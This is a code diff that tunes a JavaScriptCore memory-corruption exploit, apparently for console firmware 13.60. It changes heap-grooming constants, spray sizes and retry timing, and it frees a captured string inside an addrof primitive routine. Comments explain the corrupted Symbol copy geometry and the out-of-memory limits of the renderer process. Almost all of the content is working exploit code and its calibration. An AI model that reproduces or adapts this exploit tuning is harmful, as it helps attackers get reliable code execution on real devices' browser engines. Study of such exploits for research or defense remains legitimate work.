@@ -1,5 +1,7 @@
-const DRAIN_COUNT = 512;
-const AUTO_RETRY_DELAY_MS = 50;
+// FW 13.60 uses the proven DeepSlop low-memory geometry. The historical
+// 9M/512 profile peaks near 242 MiB before JSC overhead and OOMs the renderer.
+const DRAIN_COUNT = 128;
+const AUTO_RETRY_DELAY_MS = 1000;
 
 const K = 2;
 const DUPLICATE_INDEX = 2;
@@ -13,15 +15,12 @@ const FUNCTION_BYTES = 0x20;
 const NATIVE_EXECUTABLE_BYTES = 0x38;
 const HOLDER_BYTES = 0x40;
 
-// 9.00 copies 924,176 UTF-16 characters from this backing store (~1.85 MB).
-// This capacity is part of the 9.00 JSC exploit geometry, not merely spare
-// storage.  At 9,000,000 slots the corrupted Symbol copy is consistently
-// 924,176 characters.  Reducing it to 2,000,000 changes that copy to a bogus
-// 17,701,392 characters and makes the safe retry exhaust the WebProcess.
-const CARRIER_SLOTS = 9000000;
+// Keep the carrier large enough for the known copy geometry while leaving
+// headroom for the serialized graph, capture string, and grooming buffers.
+const CARRIER_SLOTS = 4500000;
 const CARRIER_BYTES = CARRIER_SLOTS * 8;
 const CAPTURE_DELAY_MS = 50;
-const COMPOSE_DELAY_MS = 100;
+const COMPOSE_DELAY_MS = CAPTURE_DELAY_MS + 500;
 
 const symbolToString = Symbol.prototype.toString;
 
@@ -627,6 +626,10 @@ function runAddrofCapture() {
         copiedLength = capturedString.length;
         for (let i = 0; i < 16; i++)
             capturedWords[i] = capturedString.charCodeAt(7 + i);
+        // Only the copied words and length are needed by beginComposition. The
+        // full UTF-16 string can retain a large backing allocation at the
+        // exact point where grooming starts, so drop it before composition.
+        capturedString = null;
         captureState = 1;
     } catch (error) {
         captureError = error;
